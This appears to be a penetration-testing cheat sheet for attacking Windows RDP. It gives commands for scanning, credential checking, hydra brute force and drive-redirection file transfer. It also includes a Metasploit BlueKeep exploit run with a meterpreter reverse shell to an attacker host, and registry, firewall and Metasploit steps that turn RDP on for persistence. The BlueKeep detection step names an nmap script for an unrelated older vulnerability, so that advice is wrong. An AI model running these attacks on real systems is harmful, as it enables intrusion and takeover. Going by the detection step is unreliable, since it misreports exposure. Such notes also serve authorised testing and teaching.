**RDP** (Remote Desktop Protocol) is a proprietary protocol developed by Microsoft to allow users to remotely connect to and interact with a Windows-based machine using a graphical interface. It operates on port **3389** by default and supports remote desktop, file transfer, and application sharing.


## Check if RDP is Enabled  
Use tools like `nmap` to scan for open RDP ports and confirm the service.  

```bash
nmap -p 3389 --script=rdp-enum-encryption <target>
```

## Testing RDP with Credentials  
`rdesktop`, `xfreerdp`, or `crackmapexec` can be used to validate login credentials for RDP.

**rdesktop**
```bash
rdesktop -u <username> -p <password> <target_ip>
```

**xfreerdp**
```bash
xfreerdp /u:<username> /p:<password> /v:<target_ip> /dynamic-resolution
```

**netexec**
```bash
netexec rdp <target_ip> -u <username> -p <password>
```

---
## RDP Drive Redirection (Shared Folder)

RDP supports **local drive redirection**, allowing a directory from the attacker machine to be mounted inside the remote Windows session. This provides a reliable method for **bidirectional file transfer** once valid RDP credentials are available.

### File Transfer via xfreerdp

```bash
xfreerdp /u:<username> /p:<password> /d:<domain> /v:<target_ip> /drive:<share_name>,<local_path>
```

- `<share_name>` is a logical name that will appear on the Windows system
    
- `<local_path>` is an existing directory on the attacker machine


### Accessing the Shared Folder on Windows

Once connected via RDP, the shared directory is accessible at:

```
\\tsclient\<share_name>
```

It is also visible in **File Explorer → This PC** as a redirected drive.


--- 

## Brute Force Attack on RDP  
`hydra` can be used to brute force RDP credentials.

```bash
hydra -l <username> -P <password_list> rdp://<target_ip>
```


--- 

## BlueKeep
**BlueKeep** is a critical vulnerability in the Remote Desktop Protocol (RDP) service of older Windows systems, identified as CVE-2019-0708. This exploit enables unauthenticated attackers to execute remote code on unpatched systems, potentially allowing full control over the affected machine.

#### Affected Systems
- Windows Server Versions:
	- Windows Server 2003 (if RDP is manually enabled)
	- Windows Server 2008 / 2008 R2
- Windows OS Versions:
	- Windows XP (if RDP is enabled)
    - Windows Vista
    - Windows 7

*Note: Systems updated with the May 2019 security patch or later are protected from BlueKeep. Additionally, systems with Network Level Authentication (NLA) enabled are more secure.*

#### Detection

Use Nmap to check for BlueKeep vulnerability:

```bash
nmap -p 3389 --script rdp-vuln-ms12-020 <target_ip>
```

#### **Exploitation**

Once the target is confirmed vulnerable, you can exploit BlueKeep using **Metasploit**:

```bash
msfconsole
search bluekeep
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
# Configure the exploit
set RHOST <target_ip>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
exploit
```


## Enabling RDP

The following commands enable RDP and allows traffic through the firewall.

```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

#### Metasploit
To enable RDP on a Windows target, you can use the **Metasploit module** `windows/manage/enable_rdp`.
 1. Gain access to the target machine using a Meterpreter session.
 2. Use the `windows/manage/enable_rdp` module.
```bash
use windows/manage/enable_rdp
set RHOST <target_ip>
set SESSION <seesion_id>
set RPORT 3389
run
```